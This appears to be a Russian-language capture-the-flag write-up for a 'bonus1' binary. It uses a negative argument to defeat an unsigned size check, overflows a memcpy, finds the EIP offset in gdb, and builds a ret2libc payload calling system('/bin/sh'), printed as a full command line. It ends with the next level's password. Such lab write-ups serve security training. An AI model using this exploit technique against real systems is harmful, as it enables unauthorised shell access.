# Если atoi(argv[0]) больше 9 - программа не запускается
```
0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
```
# Вызов memcpy мы можем попробовать переполнить
```
0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
```

# Поскольку программа сравнивает беззнаковые числа, мы можем передать программе отрицательное число
# UINT_MAX = 4294967295
# UINT_MAX + 1 = 0
# В коде значение умножается на 4, поэтому 1073741824
```
gdb> r -1073741824 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
[Inferior 1 (process 2051) exited normally]
```

# Хорошо, тогда нам нужно найти шаблон
# 1073741824 - (100/4) = 1073741799
```
gdb> r -1073741799 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
SIGSEGV
gdb> pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 52
EIP+0 found at offset: 56
```
# Тогда давайте найдем адрес системного вызова libc
```
gdb> info func system
[...]
0xb7e6b060  system
[...]
```
# Теперь посмотрим, где в памяти хранится строка '/ bin / sh'
```
0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
gdb> x/s 0x8048583
0x8048583:	"/bin/sh"
```

# Давайте подготовим payload
# Чтобы узнать, сколько нам нужно скопировать
# 56 + 4 + 4 + 4 = 68
# 1073741824 - (68/4) = 1073741807
```
$> ./bonus1 -1073741807 $(python -c "print 'A'*56 + '\x60\xb0\xe6\xb7' + 'DUMM' + '\x83\x85\x04\x08'")
> cat /home/user/bonus2/.pass
```
>579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

# ╮(￣_￣)╭